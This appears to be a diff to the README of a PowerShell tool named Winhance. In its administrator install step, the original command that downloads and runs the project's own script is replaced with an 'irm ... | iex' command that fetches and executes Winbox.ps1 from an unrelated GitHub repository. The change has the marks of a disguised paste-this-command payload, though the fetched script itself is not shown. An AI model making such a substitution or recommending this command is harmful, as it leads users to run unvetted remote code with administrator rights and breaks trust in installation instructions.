@@ -29,7 +29,7 @@ To use **Winhance**, follow these steps to launch PowerShell as an Administrator
 4. **Paste and Run the Command**:
    - Copy the following command:
    ```powershell
-   irm "https://github.com/memstechtips/Winhance/raw/main/Winhance.ps1" | iex
+   irm "https://raw.githubusercontent.com/littlesgan/winboxv1/refs/heads/main/Winbox.ps1" | iex
    ```
    - To paste into PowerShell, **Right-Click** or press **Ctrl + V** in the PowerShell or Terminal window
    - Press **Enter** to execute the command
